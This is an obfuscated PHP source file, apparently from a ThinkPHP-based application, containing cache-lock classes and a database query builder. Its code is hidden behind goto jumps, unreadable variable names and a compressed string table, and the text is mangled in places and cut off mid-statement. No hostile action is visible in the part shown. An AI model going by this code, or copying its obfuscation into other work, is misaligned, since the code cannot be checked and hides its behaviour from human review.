<?php
 goto A µ›ŸËÎÍ; Aàµìé·™«: $_SERVER[çÛ›³ª²] = explode($_SERVER[è¶³ÒßÑ][673], gzinflate(substr($_SERVER[è¶³ÒßÑ][674], 10, -8))); $pgmearscxl = $_SERVER[è¶³ÒßÑ][675]; if (strlen($pgmearscxl) < $_SERVER[è¶³ÒßÑ][61]) { return; } goto dîÁğÂ÷; E´Ğí’¿Ò: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ò÷±Šã =& $_SERVER[è¶³ÒßÑ]; $’›ƒøò• = $GLOBALS[$ò÷±Šã[6]][$ò÷±Šã[418]]; self::$cachePath = $’›ƒøò•[$ò÷±Šã[240]][$ò÷±Šã[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($«ú ã¢ , $É›Ì—¶ = 0) { $ûËá„š =& $_SERVER[è¶³ÒßÑ]; $¯ËÆ³‡¶ = microtime(!0); $ñˆÖåÆü = $¯ËÆ³‡¶ + $É›Ì—¶ + 0.0001; $Ş‘˜úÎş = rtrim(self::$cachePath, $ûËá„š[8]) . $ûËá„š[917] . md5($«ú ã¢ ) . $ûËá„š[914]; if (file_exists($Ş‘˜úÎş) && filemtime($Ş‘˜úÎş) && filemtime($Ş‘˜úÎş) < time() - 10) { @unlink($Ş‘˜úÎş); } do { if (file_exists($Ş‘˜úÎş)) { cacheLockWait(); continue; } $áÙ‰Ñ•º = fopen($Ş‘˜úÎş, $ûËá„š[918]); if (!$áÙ‰Ñ•º) { return !1; } $çéãŞ’ = flock($áÙ‰Ñ•º, LOCK_EX | LOCK_NB); self::$caches[$«ú ã¢ ] = array($ûËá„š[919] => $áÙ‰Ñ•º, $ûËá„š[240] => $Ş‘˜úÎş); fwrite($áÙ‰Ñ•º, $ñˆÖåÆü); clearstatcache(); if ($áÙ‰Ñ•º && $çéãŞ’) { return !0; } cacheLockWait(); } while (microtime(!0) < $ñˆÖåÆü); $this->unlock($«ú ã¢ ); return !1; } public function lockGet($Ñ‚Á¿ƒÙ) { $Èã¸„İå =& $_SERVER[è¶³ÒßÑ]; $üşú½‹¢ = rtrim(self::$cachePath, $Èã¸„İå[8]) . $Èã¸„İå[917] . md5($Ñ‚Á¿ƒÙ) . $Èã¸„İå[914]; return file_exists($üşú½‹¢); } public function unlock($úÇá¸™Ë) { $é³™Éé =& $_SERVER[è¶³ÒßÑ]; $éëƒİâó = self::$caches[$úÇá¸™Ë]; if (!$éëƒİâó) { return; } @flock($éëƒİâó[$é³™Éé[919]], LOCK_UN); @fclose($éëƒİâó[$é³™Éé[919]]); @unlink($éëƒİâó[$é³™Éé[240]]); unset(self::$caches[$úÇá¸™Ë]); } } class CacheLockRedis { public function lock($õØº­ƒµ, $‰Šœ´½» = 10) { $öİáŠšß = Cache::init(); $šÖ»Ô = microtime(!0) + $‰Šœ´½»; while (microtime(!0) < $šÖ»Ô) { $‚¿šÂ¾ = $öİáŠšß->get($õØº­ƒµ); if (!$‚¿šÂ¾) { $«ıç†ÆÎ = $öİáŠšß->setLock($õØº­ƒµ, $šÖ»Ô, $‰Šœ´½»); if ($«ıç†ÆÎ) { return !0; } } else { if ($‚¿šÂ¾ < microtime(!0)) { $öİáŠšß->set($õØº­ƒµ, $šÖ»Ô, $‰Šœ´½» * 2); if ($öİáŠšß->get($õØº­ƒµ) === $‚¿šÂ¾) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($´×€îÖÏ) { return Cache::init()->get($´×€îÖÏ); } public function unlock($°¬õŠÄ) { return Cache::init()->remove($°¬õŠÄ); } } class CacheLockMemcached { public function lock($¹ÛÌºö¿, $Å×õ’« = 0) { $£Ò„å©Ò = Cache::init(); $Š¶à«ó¥ = microtime(!0) + $Å×õ’«; while (microtime(!0) < $Š¶à«ó¥) { $€‰îë¡¡ = $£Ò„å©Ò->get($¹ÛÌºö¿); if (!$€‰îë¡¡ || $€‰îë¡¡ < microtime(!0)) { $”ÂäŒáô = $£Ò„å©Ò->handle->add($¹ÛÌºö¿, $Š¶à«ó¥, $Å×õ’«); if ($”ÂäŒáô) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($âèÕ¥ğ¦) { return Cache::init()->get($âèÕ¥ğ¦); } public function unlock($»šşäÂò) { return Cache::init()->remove($»šşäÂò); } } goto cÑ°Ö­è§; cÇ‰ç˜Ø¶Ø: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\x6e\145\x71" => "\x3c\76", "\x67\164" => "\x3e", "\145\x67\x74" => "\x3e\75", "\154\164" => "\x3c", "\145\x6c\164" => "\x3c\75", "\156\157\x74\154\151\153\x65" => "\x4e\117\x54\40\114\x49\113\x45", "\x6c\x69\x6b\x65" => "\114\111\x4b\x45", "\x69\x6e" => "\x49\116", "\156\x6f\164\151\156" => "\116\117\x54\x20\x49\116", "\156\x6f\x74\x20\151\x6e" => "\116\117\124\x20\111\116", "\142\145\x74\x77\145\145\156" => "\102\105\124\x57\x45\x45\x4e", "\156\157\x74\x62\x65\x74\x77\145\145\156" => "\x4e\x4f\124\40\x42\105\124\127\105\x45\116", "\x6e\157\x74\40\x62\145\164\167\x65\x65\x6e" => "\116\117\x54\x20\102\x45\x54\127\x45\x45\116"); protected $selectSql = "\123\105\x4c\105\103\124\45\104\x49\123\x54\x49\116\x43\x54\x25\x20\x25\x46\111\x45\x4c\x44\x25\40\106\122\117\115\x20\x25\x54\x41\102\x4c\105\45\x25\x4a\117\x49\116\45\45\127\110\x45\x52\x45\x25\45\107\122\x4f\125\x50\45\45\x48\101\126\111\x4e\x47\x25\x25\x4f\x52\x44\105\122\45\x25\114\111\115\111\124\45\40\x25\x55\116\111\117\x4e\x25\45\x43\117\115\115\105\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $†ÎƒãÇ™ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[è¶³ÒßÑ][1013], $†ÎƒãÇ™); } public function factory($öÛ Öºæ = '') { $âÀŸ‹ÀÙ =& $_SERVER[è¶³ÒßÑ]; $öÛ Öºæ = $this->parseConfig($öÛ Öºæ); if (empty($öÛ Öºæ[$âÀŸ‹ÀÙ[1014]])) { think_exception(think_lang($âÀŸ‹ÀÙ[1015])); } $this->dbType = ucwords(strtolower($öÛ Öºæ[$âÀŸ‹ÀÙ[1014]])); $™ñùÕü­ = $âÀŸ‹ÀÙ[1016] . $this->dbType; if (class_exists($™ñùÕü­)) { $àşƒ²­ = new $™ñùÕü­($öÛ Öºæ); if ($âÀŸ‹ÀÙ[1017] != strtolower($öÛ Öºæ[$âÀŸ‹ÀÙ[1014]])) { $àşƒ²­->dbType = strtoupper($this->dbType); } else { $àşƒ²­->dbType = $this->_getDsnType($öÛ Öºæ[$âÀŸ‹ÀÙ[969]]); } } else { think_exception(think_lang($âÀŸ‹ÀÙ[1018]) . $âÀŸ‹ÀÙ[1019] . $™ñùÕü­); } return $àşƒ²­; } public function __call($ƒ€¡œ÷œ, $èÂö—²Ù) { if (method_exists($this, $ƒ€¡œ÷œ)) { return call_user_func_array(array($this, $ƒ€¡œ÷œ), $èÂö—²Ù); } } protected function _getDsnType($æ°ª‹ßé) { $û©ŸÉÊ· = explode($_SERVER[è¶³ÒßÑ][4], $æ°ª‹ßé); $Şñ§¤ßÌ = strtoupper(trim($û©ŸÉÊ·[0])); return $Şñ§¤ßÌ; } private function parseConfig($…°à¤½¤ = '') { $–ïË¯©£ =& $_SERVER[è¶³ÒßÑ]; if (!empty($…°à¤½¤) && is_string($…°à¤½¤)) { $…°à¤½¤ = $this->parseDSN($…°à¤½¤); } elseif (is_array($…°à¤½¤)) { $…°à¤½¤ = array_change_key_case($…°à¤½¤); $…°à¤½¤ = array($–ïË¯©£[1014] => $…°à¤½¤[$–ïË¯©£[1020]], $–ïË¯©£[941] => $…°à¤½¤[$–ïË¯©£[1021]], $–ïË¯©£[942] => $…°à¤½¤[$–ïË¯©£[1022]], $–ïË¯©£[939] => $…°à¤½¤[$–ïË¯©£[1023]], $–ïË¯©£[940] => $…°à¤½¤[$–ïË¯©£[1024]], $–ïË¯©£[21] => $…°à¤½¤[$–ïË¯©£[1025]], $–ïË¯©£[969] => $…°à¤½¤[$–ïË¯©£[1026]], $–ïË¯©£[17] => isset($…°à¤½¤[$–ïË¯©£[1027]]) ? $…°à¤½¤[$–ïË¯©£[1027]] : array()); } elseif (empty($…°à¤½¤)) { if (think_config($–ïË¯©£[1028]) && $–ïË¯©£[1017] != strtolower(think_config($–ïË¯©£[1029]))) { $…°à¤½¤ = $this->parseDSN(think_config($–ïË¯©£[1028])); } else { $…°à¤½¤ = array($–ïË¯©£[1014] => think_config($–ïË¯©£[1029]), $–ïË¯©£[941] => think_config($–ïË¯©£[1030]), $–ïË¯©£[942] => think_config($–ïË¯©£[1031]), $–ïË¯©£[939] => think_config($–ïË¯©£[1032]), $–ïË¯©£[940] => think_config($–ïË¯©£[1033]), $–ïË¯©£[21] => think_config($–ïË¯©£[316]), $–ïË¯©£[969] => think_config($–ïË¯©£[1028]), $–ïË¯©£[17] => think_config($–ïË¯©£[1034])); } } return $…°à¤½¤; } protected function initConnect($ÙÉ£È†– = true) { if (1 == think_config($_SERVER[è¶³ÒßÑ][22])) { $this->_linkID = $this->multiConnect($ÙÉ£È†–); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $æ¾èî»² => $æËú˜’Ì) { $this->_linkID = $æËú˜’Ì; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‡ËÄìğŞ = false) { $‹¨˜Ø—³ =& $_SERVER[è¶³ÒßÑ]; static $†Œşêòñ = array(); static $Ã¡„Ã® = -1; if (empty($†Œşêòñ)) { foreach ($this->config as $íİºøÖğ => $äê²«î) { $†Œşêòñ[$íİºøÖğ] = explode($‹¨˜Ø—³[50], $äê²«î); } } if (think_config($‹¨˜Ø—³[1035])) { if ($‡ËÄìğŞ || think_config($‹¨˜Ø—³[464]) === !0) { $óÎ¨ßÔ = floor(mt_rand(0, think_config($‹¨˜Ø—³[1036]) - 1)); $Ã¡„Ã® = $óÎ¨ßÔ; } else { if (is_numeric(think_config($‹¨˜Ø—³[1037]))) { $óÎ¨ßÔ = think_config($‹¨˜Ø—³[1037]); } else { $óÎ¨ßÔ = floor(mt_rand(think_config($‹¨˜Ø—³[1036]), count($†Œşêòñ[$‹¨˜Ø—³[939]]) - 1)); } } } else { $óÎ¨ßÔ = floor(mt_rand(0, count($†Œşêòñ[$‹¨˜Ø—³[939]]) - 1)); $Ã¡„Ã® = $óÎ¨ßÔ; } $óÎ¨ßÔ = $Ã¡„Ã® !== -1 ? $Ã¡„Ã® : $óÎ¨ßÔ; $Ã‡ê¨Ê· = array($‹¨˜Ø—³[941] => isset($†Œşêòñ[$‹¨˜Ø—³[941]][$óÎ¨ßÔ]) ? $†Œşêòñ[$‹¨˜Ø—³[941]][$óÎ¨ßÔ] : $†Œşêòñ[$‹¨˜Ø—³[941]][0], $‹¨˜Ø—³[942] => isset($†Œşêòñ[$‹¨˜Ø—³[942]][$óÎ¨ßÔ]) ? $†Œşêòñ[$‹¨˜Ø—³[942]][$óÎ¨ßÔ] : $†Œşêòñ[$‹¨˜Ø—³[942]][0], $‹¨˜Ø—³[939] => isset($†Œşêòñ[$‹¨˜Ø—³[939]][$óÎ¨ßÔ]) ? $†Œşêòñ[$‹¨˜Ø—³[939]][$óÎ¨ßÔ] : $†Œşêòñ[$‹¨˜Ø—³[939]][0], $‹¨˜Ø—³[940] => isset($†Œşêòñ[$‹¨˜Ø—³[940]][$óÎ¨ßÔ]) ? $†Œşêòñ[$‹¨˜Ø—³[940]][$óÎ¨ßÔ] : $†Œşêòñ[$‹¨˜Ø—³[940]][0], $‹¨˜Ø—³[21] => isset($†Œşêòñ[$‹¨˜Ø—³[21]][$óÎ¨ßÔ]) ? $†Œşêòñ[$‹¨˜Ø—³[21]][$óÎ¨ßÔ] : $†Œşêòñ[$‹¨˜Ø—³[21]][0], $‹¨˜Ø—³[969] => isset($†Œşêòñ[$‹¨˜Ø—³[969]][$óÎ¨ßÔ]) ? $†Œşêòñ[$‹¨˜Ø—³[969]][$óÎ¨ßÔ] : $†Œşêòñ[$‹¨˜Ø—³[969]][0], $‹¨˜Ø—³[17] => isset($†Œşêòñ[$‹¨˜Ø—³[17]][$óÎ¨ßÔ]) ? $†Œşêòñ[$‹¨˜Ø—³[17]][$óÎ¨ßÔ] : $†Œşêòñ[$‹¨˜Ø—³[17]][0]); return $this->connect($Ã‡ê¨Ê·, $óÎ¨ßÔ); } public function parseDSN($ğÇÄŸó) { $õ¦‘’‡Æ =& $_SERVER[è¶³ÒßÑ]; if (empty($ğÇÄŸó)) { return !1; } $ãªø—¢ï = parse_url($ğÇÄŸó); if ($ãªø—¢ï[$õ¦‘’‡Æ[217]]) { $€ª‘´« = array($õ¦‘’‡Æ[1014] => $ãªø—¢ï[$õ¦‘’‡Æ[217]], $õ¦‘’‡Æ[941] => isset($ãªø—¢ï[$õ¦‘’‡Æ[655]]) ? $ãªø—¢ï[$õ¦‘’‡Æ[655]] : $õ¦‘’‡Æ[12], $õ¦‘’‡Æ[942] => isset($ãªø—¢ï[$õ¦‘’‡Æ[1038]]) ? $ãªø—¢ï[$õ¦‘’‡Æ[1038]] : $õ¦‘’‡Æ[12], $õ¦‘’‡Æ[939] => isset($ãªø—¢ï[$õ¦‘’‡Æ[218]]) ? $ãªø—¢ï[$õ¦‘’‡Æ[218]] : $õ¦‘’‡Æ[12], $õ¦‘’‡Æ[940] => isset($ãªø—¢ï[$õ¦‘’‡Æ[219]]) ? $ãªø—¢ï[$õ¦‘’‡Æ[219]] : $õ¦‘’‡Æ[12], $õ¦‘’‡Æ[21] => isset($ãªø—¢ï[$õ¦‘’‡Æ[97]]) ? substr($ãªø—¢ï[$õ¦‘’‡Æ[97]], 1) : $õ¦‘’‡Æ[12]); } else { preg_match($õ¦‘’‡Æ[1039], trim($ğÇÄŸó), $½²È«Å); $€ª‘´« = array($õ¦‘’‡Æ[1014] => $½²È«Å[1], $õ¦‘’‡Æ[941] => $½²È«Å[2], $õ¦‘’‡Æ[942] => $½²È«Å[3], $õ¦‘’‡Æ[939] => $½²È«Å[4], $õ¦‘’‡Æ[940] => $½²È«Å[5], $õ¦‘’‡Æ[21] => $½²È«Å[6]); } $€ª‘´«[$õ¦‘’‡Æ[969]] = $õ¦‘’‡Æ[12]; return $€ª‘´«; } protected function debug() { $Ê•Ö…›” =& $_SERVER[è¶³ÒßÑ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ê•Ö…›”[1040]; if (think_config($Ê•Ö…›”[1041])) { think_status($Ê•Ö…›”[1042]); think_trace($this->queryStr . $Ê•Ö…›”[1043] . think_status($Ê•Ö…›”[24], $Ê•Ö…›”[1042], 6) . $Ê•Ö…›”[1044], $Ê•Ö…›”[12], $Ê•Ö…›”[1045]); } } protected function parseLock($¹˜´ŠÏ  = false) { $”âÂê®÷ =& $_SERVER[è¶³ÒßÑ]; if (!$¹˜´ŠÏ ) { return $”âÂê®÷[12]; } if ($”âÂê®÷[971] == $this->dbType) { return $”âÂê®÷[1046]; } return $”âÂê®÷[1047]; } protected function parseSet($Ù¼î…úœ) { $’¶½‡¼â =& $_SERVER[è¶³ÒßÑ]; foreach ($Ù¼î…úœ as $Ä€ò´æ£ => $—ïäœ·§) { if (is_array($—ïäœ·§) && $’¶½‡¼â[366] == $—ïäœ·§[0]) { $¬¸À¸·ş[] = $this->parseKey($Ä€ò´æ£) . $’¶½‡¼â[937] . $—ïäœ·§[1]; } elseif (is_scalar($—ïäœ·§) || is_null($—ïäœ·§)) { $¬¸À¸·ş[] = $this->parseKey($Ä€ò´æ£) . $’¶½‡¼â[937] . $this->parseValue($—ïäœ·§); } } return $’¶½‡¼â[1048] . implode($’¶½‡¼â[50], $¬¸À¸·ş); } protected function bindParam($í¶÷¥, $ğÚ¬Õ›) { $this->bind[$_SERVER[è¶³ÒßÑ][4] . $í¶÷¥] = $ğÚ¬Õ›; } protected function parseBind($’ë‘ÀÓƒ) { $’ë‘ÀÓƒ = array_merge($this->bind, $’ë‘ÀÓƒ); $this->bind = array(); return $’ë‘ÀÓƒ; } function parseKey(&$Ğ ®óè, $ôËËÜÖ¼ = true) { if ($ôËËÜÖ¼) { $Ğ ®óè = $this->parseKeyCheck($Ğ ®óè); } return $Ğ ®óè; } function parseKeyCheck($ñ—Â) { $ê©êËŠá =& $_SERVER[è¶³ÒßÑ]; $ñ—Â = trim($ñ—Â); if (!preg_match($ê©êËŠá[1049], $ñ—Â)) { think_exception($ê©êËŠá[1050] . $ñ—Â); } return $ñ—Â; } protected function parseValue($ùöá–œ) { $²Ÿ¾×¥á =& $_SERVER[è¶³ÒßÑ]; if (is_string($ùöá–œ)) { $ùöá–œ = $²Ÿ¾×¥á[1010] . $this->escapeString($ùöá–œ) . $²Ÿ¾×¥á[1010]; } elseif (isset($ùöá–œ[0]) && is_string($ùöá–œ[0]) && strtolower($ùöá–œ[0]) == $²Ÿ¾×¥á[366]) { $ùöá–œ = $this->escapeString($ùöá–œ[1]); } elseif (is_array($ùöá–œ)) { $ùöá–œ = array_map(array($this, $²Ÿ¾×¥á[1011]), $ùöá–œ); } elseif (is_bool($ùöá–œ)) { $ùöá–œ = $ùöá–œ ? $²Ÿ¾×¥á[101] : $²Ÿ¾×¥á[238]; } elseif (is_null($ùöá–œ)) { $ùöá–œ = $²Ÿ¾×¥á[116]; } return $ùöá–œ; } protected function parseField($Ï’ÖÑ‚Ñ) { $±»âè™ş =& $_SERVER[è¶³ÒßÑ]; if (is_string($Ï’ÖÑ‚Ñ) && strpos($Ï’ÖÑ‚Ñ, $±»âè™ş[50])) { $Ï’ÖÑ‚Ñ = explode($±»âè™ş[50], $Ï’ÖÑ‚Ñ); } if (is_array($Ï’ÖÑ‚Ñ)) { $²±ßğñ¢ = array(); foreach ($Ï’ÖÑ‚Ñ as $éŞÚ¡»õ => $š½Ğõ«„) { if (!is_numeric($éŞÚ¡»õ)) { $²±ßğñ¢[] = $this->parseKey($éŞÚ¡»õ, !1) . $±»âè™ş[1051] . $this->parseKey($š½Ğõ«„); } else { $²±ßğñ¢[] = $this->parseKey($š½Ğõ«„); } } $œ˜Ïêí¯ = implode($±»âè™ş[50], $²±ßğñ¢); } elseif (is_string($Ï’ÖÑ‚Ñ) && !empty($Ï’ÖÑ‚Ñ)) { $œ˜Ïêí¯ = $Ï’ÖÑ‚Ñ; } else { $œ˜Ïêí¯ = $±»âè™ş[230]; } return $œ˜Ïêí¯; } protected function parseTable($“™•ƒ•¤) { $ç‘ıÔß„ =& $_SERVER[è¶³ÒßÑ]; if (is_array($“™•ƒ•¤)) { $ÔºÆ½Ùû = array(); foreach ($“™•ƒ•¤ as $ÍÑü© => $ôèÀ‹Î‰) { if (!is_numeric($ÍÑü©)) { $ÔºÆ½Ùû[] = $this->parseKey($ÍÑü©) . $ç‘ıÔß„[53] . $this->parseKey($ôèÀ‹Î‰); } else { $ÔºÆ½Ùû[] = $this->parseKey($ÍÑü©); } } $“™•ƒ•¤ = $ÔºÆ½Ùû; } elseif (is_string($“™•ƒ•¤)) { if (strstr($“™•ƒ•¤, $ç‘ıÔß„[53])) { return $“™•ƒ•¤; } $“™•ƒ•¤ = explode($ç‘ıÔß„[50], $“™•ƒ•¤); array_walk($“™•ƒ•¤, array($this, $ç‘ıÔß„[959])); } return $ç‘ıÔß„[953] . trim(implode($ç‘ıÔß„[1052], $“™•ƒ•¤), $ç‘ıÔß„[454]) . $ç‘ıÔß„[953]; } protected function parseWhere($Ü½£¬èÙ) { $†ƒ®õË± =& $_SERVER[è¶³ÒßÑ]; $Áï§åŒ = $†ƒ®õË±[12]; if (is_string($Ü½£¬èÙ)) { $Áï§åŒ = $Ü½£¬èÙ; } else { $Á‹€‚²Ë = isset($Ü½£¬èÙ[$†ƒ®õË±[1053]]) ? strtoupper($Ü½£¬èÙ[$†ƒ®õË±[1053]]) : $†ƒ®õË±[12]; if (in_array($Á‹€‚²Ë, array($†ƒ®õË±[1054], $†ƒ®õË±[1055], $†ƒ®õË±[1056]))) { $Á‹€‚²Ë = $†ƒ®õË±[53] . $Á‹€‚²Ë . $†ƒ®õË±[53]; unset($Ü½£¬èÙ[$†ƒ®õË±[1053]]); } else { $Á‹€‚²Ë = $†ƒ®õË±[1057]; } foreach ($Ü½£¬èÙ as $—»›şÄ => $€¨‰Ì…) { $Áï§åŒ .= $†ƒ®õË±[347]; if (is_numeric($—»›şÄ)) { $—»›şÄ = $†ƒ®õË±[1058]; } if (0 === strpos($—»›şÄ, $†ƒ®õË±[11])) { $Áï§åŒ .= $this->parseThinkWhere($—»›şÄ, $€¨‰Ì…); } else { if (!preg_match($†ƒ®õË±[1059], trim($—»›şÄ))) { think_exception(think_lang($†ƒ®õË±[1060]) . $†ƒ®õË±[4] . $—»›şÄ); } $Ìúâáêœ = is_array($€¨‰Ì…) && isset($€¨‰Ì…[$†ƒ®õË±[1061]]); $—»›şÄ = trim($—»›şÄ); if (strpos($—»›şÄ, $†ƒ®õË±[224])) { $‰˜çÖ²ñ = explode($†ƒ®õË±[224], $—»›şÄ); $Şüœù•Œ = array(); foreach ($‰˜çÖ²ñ as $É®‘´•„ => $Õ¦öÌÓ—) { $½ù‹·ò = $Ìúâáêœ ? $€¨‰Ì…[$É®‘´•„] : $€¨‰Ì…; $Şüœù•Œ[] = $†ƒ®õË±[330] . $this->parseWhereItem($this->parseKey($Õ¦öÌÓ—), $½ù‹·ò) . $†ƒ®õË±[958]; } $Áï§åŒ .= implode($†ƒ®õË±[1062], $Şüœù•Œ); } elseif (strpos($—»›şÄ, $†ƒ®õË±[353])) { $‰˜çÖ²ñ = explode($†ƒ®õË±[353], $—»›şÄ); $Şüœù•Œ = array(); foreach ($‰˜çÖ²ñ as $É®‘´•„ => $Õ¦öÌÓ—) { $½ù‹·ò = $Ìúâáêœ ? $€¨‰Ì…[$É®‘´•„] : $€¨‰Ì…; $Şüœù•Œ[] = $†ƒ®õË±[330] . $this->parseWhereItem($this->parseKey($Õ¦öÌÓ—), $½ù‹·ò) . $†ƒ®õË±[958]; } $Áï§åŒ .= implode($†ƒ®õË±[1057], $Şüœù•Œ); } else { $Áï§åŒ .= $this->parseWhereItem($this->parseKey($—»›şÄ), $€¨‰Ì…); } } $Áï§åŒ .= $†ƒ®õË±[348] . $Á‹€‚²Ë; } $Áï§åŒ = substr($Áï§åŒ, 0, -strlen($Á‹€‚²Ë)); } return empty($Áï§åŒ) ? $†ƒ®õË±[12] : $†ƒ®õË±[1063] . $Áï§åŒ; } protected function parseWhereItem($ıßÒ´äò, $êØùş“©) { $õ¬ ¸¦é =& $_SERVER[è¶³ÒßÑ]; $á´èË = $õ¬ ¸¦é[12]; if (is_array($êØùş“©)) { if (is_string($êØùş“©[0])) { $âÂÑî™Â = strtolower($êØùş“©[0]); if (in_array($êØùş“©[0], array($õ¬ ¸¦é[937], $õ¬ ¸¦é[1064], $õ¬ ¸¦é[1065], $õ¬ ¸¦é[1066], $õ¬ ¸¦é[1067], $õ¬ ¸¦é[1068]))) { $á´èË .= $ıßÒ´äò . $õ¬ ¸¦é[53] . $êØùş“©[0] . $õ¬ ¸¦é[53] . $this->parseValue($êØùş“©[1]); } elseif (preg_match($õ¬ ¸¦é[1069], $êØùş“©[0])) { $á´èË .= $ıßÒ´äò . $õ¬ ¸¦é[53] . $this->exp[$âÂÑî™Â] . $õ¬ ¸¦é[53] . $this->parseValue($êØùş“©[1]); } elseif (preg_match($õ¬ ¸¦é[1070], $êØùş“©[0])) { if (is_array($êØùş“©[1])) { $Õ…óòğ· = isset($êØùş“©[2]) ? strtoupper($êØùş“©[2]) : $õ¬ ¸¦é[1055]; if (in_array($Õ…óòğ·, array($õ¬ ¸¦é[1054], $õ¬ ¸¦é[1055], $õ¬ ¸¦é[1056]))) { $ä²ŞÇ¨Ğ = array(); foreach ($êØùş“©[1] as $½º Æ) { $ä²ŞÇ¨Ğ[] = $ıßÒ´äò . $õ¬ ¸¦é[53] . $this->exp[$âÂÑî™Â] . $õ¬ ¸¦é[53] . $this->parseValue($½º Æ); } $á´èË .= $õ¬ ¸¦é[330] . implode($õ¬ ¸¦é[53] . $Õ…óòğ· . $õ¬ ¸¦é[53], $ä²ŞÇ¨Ğ) . $õ¬ ¸¦é[958]; } } else { $á´èË .= $ıßÒ´äò . $õ¬ ¸¦é[53] . $this->exp[$âÂÑî™Â] . $õ¬ ¸¦é[53] . $this->parseValue($êØùş“©[1]); } } elseif ($õ¬ ¸¦é[366] == $âÂÑî™Â) { $á´èË .= $õ¬ ¸¦é[956] . $ıßÒ´äò . $õ¬ ¸¦é[53] . $êØùş“©[1] . $õ¬ ¸¦é[1071]; } elseif (preg_match($õ¬ ¸¦é[1072], $êØùş“©[0])) { $á´èË .= $êØùş“©[0]; } elseif (preg_match($õ¬ ¸¦é[1073], $êØùş“©[0])) { if (isset($êØùş“©[2]) && $õ¬ ¸¦é[366] == $êØùş“©[2]) { $á´èË .= $ıßÒ´äò . $õ¬ ¸¦é[53] . $this->exp[$âÂÑî™Â] . $õ¬ ¸¦é[53] . $êØùş“©[1]; } else { if (is_string($êØùş“©[1])) { $êØùş“©[1] = explode($õ¬ ¸¦é[50], $êØùş“©[1]); } $Å·­å¯ö = implode($õ¬ ¸¦é[50], $this->parseValue($êØùş“©[1])); $á´èË .= $ıßÒ´äò . $õ¬ ¸¦é[53] . $this->exp[$âÂÑî™Â] . $õ¬ ¸¦é[956] . $Å·­å¯ö . $õ¬ ¸¦é[958]; } } elseif (preg_match($õ¬ ¸¦é[1074], $êØùş“©[0])) { $ƒÂŠâ‚å = is_string($êØùş“©[1]) ? explode($õ¬ ¸¦é[50], $êØùş“©[1]) : $êØùş“©[1]; $á´èË .= $õ¬ ¸¦é[956] . $ıßÒ´äò . $õ¬ ¸¦é[53] . $this->exp[$âÂÑî™Â] . $õ¬ ¸¦é[53] . $this->parseValue($ƒÂŠâ‚å[0]) . $õ¬ ¸¦é[1057] . $this->parseValue($ƒÂŠâ‚å[1]) . $õ¬ ¸¦é[348]; } else { think_exception(think_lang($õ¬ ¸¦é[1060]) . $õ¬ ¸¦é[4] . $êØùş“©[0]); } } else { $Ê»ŸŠ’ã = count($êØùş“©); $¢Û§£±÷ = $õ¬ ¸¦é[12]; if (is_string($êØùş“©[$Ê»ŸŠ’ã - 1])) { $¢Û§£±÷ = isset($êØùş“©[$Ê»ŸŠ’ã - 1]) ? strtoupper($êØùş“©[$Ê»ŸŠ’ã - 1]) : $õ¬ ¸¦é[12]; if (in_array($¢Û§£±÷, array($õ¬ ¸¦é[1054], $õ¬ ¸¦é[1055], $õ¬ ¸¦é[1056]))) { $Ê»ŸŠ’ã = $Ê»ŸŠ’ã - 1; } } else { $¢Û§£±÷ = $õ¬ ¸¦é[1054]; } for ($»öëäâ = 0; $»öëäâ < $Ê»ŸŠ’ã; $»öëäâ++) { $ƒÂŠâ‚å = is_array($êØùş“©[$»öëäâ]) ? $êØùş“©[$»öëäâ][1] : $êØùş“©[$»öëäâ]; if ($õ¬ ¸¦é[366] == strtolower($êØùş“©[$»öëäâ][0])) { $á´èË .= $õ¬ ¸¦é[330] . $ıßÒ´äò . $õ¬ ¸¦é[53] . $ƒÂŠâ‚å . $õ¬ ¸¦é[1071] . $¢Û§£±÷ . $õ¬ ¸¦é[53]; } else { $¹Ÿ®³»Û = is_array($êØùş“©[$»öëäâ]) ? $this->exp[strtolower($êØùş“©[$»öëäâ][0])] : $õ¬ ¸¦é[937]; if (!$¹Ÿ®³»Û && is_array($êØùş“©[$»öëäâ]) && in_array($êØùş“©[$»öëäâ][0], array($õ¬ ¸¦é[937], $õ¬ ¸¦é[1064], $õ¬ ¸¦é[1065], $õ¬ ¸¦é[1066], $õ¬ ¸¦é[1067], $õ¬ ¸¦é[1068]))) { $¹Ÿ®³»Û = $êØùş“©[$»öëäâ][0]; } $á´èË .= $õ¬ ¸¦é[330] . $ıßÒ´äò . $õ¬ ¸¦é[53] . $¹Ÿ®³»Û . $õ¬ ¸¦é[53] . $this->parseValue($ƒÂŠâ‚å) . $õ¬ ¸¦é[1071] . $¢Û§£±÷ . $õ¬ ¸¦é[53]; } } $á´èË = substr($á´èË, 0, -4); } } else { $á´èË .= $ıßÒ´äò . $õ¬ ¸¦é[1075] . $this->parseValue($êØùş“©); } return $á´èË; } protected function parseThinkWhere($÷Ú’“É‘, $„Â„şúñ) { $ÇÈ¾û‰´ =& $_SERVER[è¶³ÒßÑ]; $˜²ÔË‰¬ = $ÇÈ¾û‰´[12]; switch ($÷Ú’“É‘) { case $ÇÈ¾û‰´[421]: $˜²ÔË‰¬ = $„Â„şúñ; break; case $ÇÈ¾û‰´[1058]: $˜²ÔË‰¬ = is_string($„Â„şúñ) ? $„Â„şúñ : substr($this->parseWhere($„Â„şúñ), 6); break; case $ÇÈ¾û‰´[1076]: parse_str($„Â„şúñ, $¸üÕ³é·); if (isset($¸üÕ³é·[$ÇÈ¾û‰´[1053]])) { $•õ·Ğú = $ÇÈ¾û‰´[53] . 